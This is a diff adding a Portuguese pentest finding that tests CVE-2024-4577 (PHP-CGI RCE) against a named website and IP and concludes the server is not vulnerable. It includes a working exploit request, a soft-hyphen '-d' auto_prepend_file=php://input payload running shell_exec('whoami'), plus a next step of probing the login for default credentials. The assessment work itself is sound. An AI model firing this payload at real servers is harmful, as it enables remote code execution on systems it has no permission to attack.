@@ -1,0 +1,64 @@
+# F-014 CVE-2024-4577 — Windows PHP-CGI RCE (NEGADO)
+
+Alvo: http://wpp.fernandapessoa.com.br (177.44.191.252)
+Severidade: Info (não confirmada — testado e descartado)
+Timestamp: 2026-08-27T16:55:00Z
+CVE: CVE-2024-4577
+
+## Reprodução
+
+1. Fingerprint do servidor (curl direto):
+```
+HTTP/1.1 302 Found
+Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.33
+X-Powered-By: PHP/7.4.33
+Location: sc_Login/
+```
+→ Confirma Windows + PHP 7.4.33 (EOL), app = ScriptCase (redireciona para /sc_Login/).
+
+2. Teste de detecção CGI `?-s` e `?-v`:
+   - Ambos retornaram `302 Found` → redirecionamento normal da app.
+   - NÃO houve disclosure de source/phpinfo → comportamento consistente com mod_php (não CGI).
+
+3. PoC CVE-2024-4577 (soft-hyphen %ad):
+```
+curl "http://wpp.../?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input" --data '<?php echo shell_exec("whoami"); ?>'
+→ STATUS:000 (timeout/connection drop)
+```
+
+4. Teste de controle crítico — %ad com diretiva que NÃO usa php://input:
+```
+curl "http://wpp.../?%ADd+display_errors=1+%ADd+error_reporting=32767"
+→ HTTP/1.1 302 Found (comportamento normal — login redirect)
+```
+→ Se %ad fosse interpretado como dash `-d` (PHP CLI directive via BestFit), `display_errors=1` ativaria erros e mudaria a resposta. A resposta permaneceu 302 idêntica ao baseline → **%ad NÃO está sendo convertido para `-d`** → NÃO é modo CGI.
+
+5. Teste de controle — `php://input` no querystring causa STATUS:000 mesmo sem payload %ad:
+```
+curl "http://wpp.../?-d+allow_url_include=1+-d+auto_prepend_file=php://input" --data '...'
+→ STATUS:000
+```
+→ O drop acontece sempre que `php://input` aparece na URL, com ou sem %ad. Isso indica **WAF/ModSecurity filtering** no padrão `php://input`, não interpretação CGI.
+
+## Interpretação
+
+CVE-2024-4577 afeta EXCLUSIVAMENTE instalações PHP executadas via `php-cgi.exe` no Windows, onde o BestFit charset conversion transforma o soft-hyphen (U+00AD) em dash `-`, permitindo passar opções `-d` ao interpretador PHP.
+
+Aqui:
+- O servidor roda **Apache mod_php** (não php-cgi.exe) — o `%ad` é tratado como um query parameter comum, sem conversão BestFit.
+- A diretiva `%ADd+display_errors=1` NÃO alterou o comportamento da resposta (continuou 302), provando que NÃO há interpretação como flag CLI.
+- O `STATUS:000` observado é causado por WAF/filter que derruba requisições contendo `php://input` (padrão de ataque conhecido), não por RCE.
+
+## Impacto
+
+NENHUM. CVE-2024-4577 não é aplicável a este alvo.
+
+## Recomendação
+
+- Manter PHP atualizado (atual para 7.4.33 EOL — recomenda-se upgrade para 8.2+ por questões de suporte, mesmo que CVE-2024-4577 não se aplique).
+- Confirmar com o administrador que PHP roda como módulo Apache (mod_php) e não como CGI, para descartar futuras regressões.
+- O WAF atual já bloqueia padrões `php://input` (bom).
+
+## Próximo passo
+
+- Descartado CVE-2024-4577. Prosseguir com enumeração do ScriptCase (/sc_Login/) em busca de credenciais default ou CVEs do próprio ScriptCase.
